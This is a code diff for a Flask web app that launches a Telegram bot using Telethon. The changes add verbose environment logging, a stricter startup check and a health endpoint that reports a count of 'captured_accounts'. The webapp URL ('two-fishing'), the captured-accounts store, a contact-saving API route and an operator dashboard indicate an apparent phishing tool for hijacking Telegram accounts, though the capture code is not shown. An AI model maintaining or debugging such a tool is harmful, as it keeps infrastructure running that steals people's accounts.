@@ -6,13 +6,17 @@ import threading
 import asyncio
 import logging
 import traceback
+import uuid
 from datetime import datetime
 import requests as http_requests
 from telethon import TelegramClient, errors
 from telethon.sessions import StringSession
 import sys
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
+)
 logger = logging.getLogger(__name__)
 
 
@@ -30,9 +34,19 @@ YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
 PORT = _si(os.environ.get("PORT"), 5000)
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 
-logger.info("ENV | BOT=%s API_ID=%s API_HASH=%s OWNER=%s URL=%s",
-    "SET" if BOT_TOKEN else "MISSING", API_ID,
-    "SET" if API_HASH else "MISSING", YOUR_TELEGRAM_ID, WEBAPP_URL)
+logger.info("=" * 60)
+logger.info("ENV CHECK")
+logger.info(f"  BOT_TOKEN     : {'SET (' + str(len(BOT_TOKEN)) + ' chars)' if BOT_TOKEN else 'MISSING'}")
+logger.info(f"  API_ID        : {API_ID}")
+logger.info(f"  API_HASH      : {'SET (' + str(len(API_HASH)) + ' chars)' if API_HASH else 'MISSING'}")
+logger.info(f"  OWNER_ID      : {YOUR_TELEGRAM_ID}")
+logger.info(f"  PORT          : {PORT}")
+logger.info(f"  WEBAPP_URL    : {WEBAPP_URL}")
+logger.info("=" * 60)
+
+if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
+    logger.error("!!! SOME ENV VARS MISSING — BOT WILL NOT START !!!")
+    logger.error("Set: BOT_TOKEN, API_ID, API_HASH, OWNER_ID in Render Environment tab")
 
 if sys.version_info >= (3, 12) and sys.platform == 'win32':
     try:
@@ -631,7 +645,18 @@ def tg_route():
 
 @app.route('/health')
 def health():
-    return jsonify({'status': 'ok', 'accounts': len(captured_accounts)})
+    return jsonify({
+        'status': 'ok',
+        'bot_thread_alive': _bot_thread.is_alive() if '_bot_thread' in globals() else False,
+        'env': {
+            'BOT_TOKEN': 'SET' if BOT_TOKEN else 'MISSING',
+            'API_ID': API_ID,
+            'API_HASH': 'SET' if API_HASH else 'MISSING',
+            'OWNER_ID': YOUR_TELEGRAM_ID,
+            'WEBAPP_URL': WEBAPP_URL
+        },
+        'accounts': len(captured_accounts)
+    })
 
 
 @app.route('/api/save_contact', methods=['POST'])
@@ -723,25 +748,31 @@ def dash():
 # ============ START BOT IN BACKGROUND THREAD ============
 def _run_bot():
     try:
-        logger.info("=" * 50)
+        logger.info("=" * 60)
         logger.info("Starting bot thread...")
+        logger.info("Attempting to import bot.py...")
         import bot as botmod
-        logger.info("bot.py imported OK")
+        logger.info("bot.py imported successfully")
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        logger.info("Event loop created, calling bot.main()")
+        logger.info("Event loop created")
+        logger.info("Calling botmod.main()...")
         loop.run_until_complete(botmod.main())
     except Exception as e:
-        logger.error(f"BOT THREAD CRASH: {e}")
+        logger.error("=" * 60)
+        logger.error(f"BOT THREAD CRASH: {type(e).__name__}: {e}")
         logger.error(traceback.format_exc())
+        logger.error("=" * 60)
 
 
-_bot_thread = threading.Thread(target=_run_bot, daemon=True, name="telegram-bot")
-_bot_thread.start()
-logger.info("Bot background thread launched")
+if BOT_TOKEN and API_ID and API_HASH and YOUR_TELEGRAM_ID:
+    _bot_thread = threading.Thread(target=_run_bot, daemon=True, name="telegram-bot")
+    _bot_thread.start()
+    logger.info("Bot background thread launched")
+else:
+    _bot_thread = None
+    logger.error("Bot NOT started — env vars missing")
 
 
 if __name__ == '__main__':
-    if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
-        logger.warning("Some env vars missing!")
     app.run(host='0.0.0.0', port=PORT, debug=False)
